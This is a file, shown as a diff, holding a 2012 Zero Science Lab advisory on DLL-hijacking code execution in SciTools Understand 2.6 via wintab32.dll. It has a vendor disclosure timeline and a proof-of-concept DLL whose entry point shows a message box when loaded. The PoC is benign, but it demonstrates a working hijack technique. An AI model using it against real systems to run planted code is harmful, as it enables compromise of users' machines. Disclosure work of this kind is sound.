@@ -1,0 +1,71 @@
+/*
+
+
+SciTools Understand 2.6 (wintab32.dll) DLL Loading Arbitrary Code Execution
+
+
+Vendor: Scientific Toolworks, Inc.
+Product web page: http://www.scitools.com
+Affected version: 2.6 (build 598)
+
+Summary: Understand is a static analysis tool for maintaining, measuring,
+and analyzing critical or large code bases.
+
+Desc: The vulnerability is caused due to the application loading libraries
+(wintab32.dll) in an insecure manner. This can be exploited to load arbitrary
+libraries by tricking a user into opening an Understand Project file (.UDB)
+located on a remote WebDAV or SMB share.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Vendor status:
+
+[29.01.2012] Vulnerability discovered.
+[30.01.2012] Contact with the vendor.
+[30.01.2012] Vendor replies with e-mail info for their european partner.
+[30.01.2012] Contacted the new e-mail given with sent details and PoC code.
+[31.01.2012] Vendor answers and sends the report to the appropriate division.
+[31.01.2012] Asked vendor for confirmation and scheduled patch release date.
+[02.02.2012] Vendor responds with confirmation and a scheduled release for a fix.
+[08.02.2012] Vendor releases patched version 2.6.600 (Build 600): http://scitools.com/download/latest/Understand/Understand-2.6.600-Windows-32bit.exe.
+[08.02.2012] Coordinated public security advisory released.
+
+
+Advisory ID: ZSL-2012-5071
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5071.php
+
+Vendor advisory: http://www.scitools.com/support/buildLogs.php
+
+
+29.01.2012
+
+*/
+
+
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+
+	switch (fdwReason)
+	{
+		case DLL_PROCESS_ATTACH:
+		dll_mll();
+		case DLL_THREAD_ATTACH:
+		case DLL_THREAD_DETACH:
+		case DLL_PROCESS_DETACH:
+		break;
+	}
+
+	return TRUE;
+}
+
+int dll_mll()
+{
+	MessageBox(0, "DLL Flownapped!", "DLL Message", MB_OK);
+}
